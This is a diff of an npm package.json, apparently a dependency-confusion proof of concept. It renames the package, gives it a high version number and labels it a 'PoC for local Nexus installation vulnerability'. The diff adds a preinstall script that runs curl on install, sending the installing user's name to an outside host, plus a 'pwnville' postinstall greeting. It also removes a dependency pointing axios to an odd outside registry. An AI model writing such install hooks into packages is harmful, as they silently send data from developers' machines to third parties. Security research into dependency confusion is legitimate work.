@@ -1,15 +1,13 @@
 {
-  "name": "consul-lock-sessions",
-  "version": "99.0.0",
-  "description": "",
+  "name": "opx-base-component",
+  "version": "1.99.1",
+  "description": "PoC for local Nexus installation vulnerability",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+	"preinstall": "curl -H \"X-WhoAmI: $USER\" https://dev.oscato.com/opx-base-component-postinstall",
+	"postinstall": "echo \"Greetings from pwnville, PoCfully yours\""
   },
-  "keywords": [],
   "author": "",
-  "license": "ISC",
-  "dependencies": {
-     "axios": "https://registry.storageartifact.com/consul-lock-sessions"
-  }
+  "license": "ISC"
 }
